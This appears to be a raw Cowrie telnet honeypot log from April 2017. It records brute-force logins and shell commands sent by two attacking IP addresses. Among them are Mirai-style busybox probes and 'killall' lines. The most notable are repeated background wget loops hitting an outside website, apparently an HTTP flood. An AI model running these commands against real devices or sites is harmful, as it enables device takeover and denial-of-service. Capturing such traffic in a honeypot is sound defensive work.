2017-04-11T03:55:14+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:16+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt: 1183
2017-04-11T03:55:16+0000 [CowrieTelnetTransport,222056,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:18+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt [>/dev/netslink/.ptmx && cd /dev/netslink//>/dev/shm/.ptmx && cd /dev/shm/] failed
2017-04-11T03:55:18+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:19+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt: 1184
2017-04-11T03:55:19+0000 [CowrieTelnetTransport,222056,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:21+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt [>/bin/.ptmx && cd /bin//>/etc/.ptmx && cd /etc/] failed
2017-04-11T03:55:21+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:22+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt: 1185
2017-04-11T03:55:22+0000 [CowrieTelnetTransport,222056,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:24+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt [>/boot/.ptmx && cd /boot//>/usr/.ptmx && cd /usr/] failed
2017-04-11T03:55:24+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:24+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt: 1186
2017-04-11T03:55:24+0000 [CowrieTelnetTransport,222056,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:27+0000 [CowrieTelnetTransport,222056,185.35.138.83] login attempt [/bin/busybox rm -rf peinwashere pnpu//bin/busybox cp /bin/busybox peinwashere; >peinwashere; /bin/busybox chmod 777 peinwashere; /bin/busybox NJASD] failed
2017-04-11T03:55:27+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:27+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1187
2017-04-11T03:55:27+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [root/juantech] failed
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: enable
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: enable 
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: system
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: system
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh 
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: run
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: run
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: killall wget; killall ping; killall sh
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: killall wget
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: killall ping
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: killall sh
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: shell
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: shell
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: enable
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: enable 
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: system
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: system
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh 
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: run
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: run
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
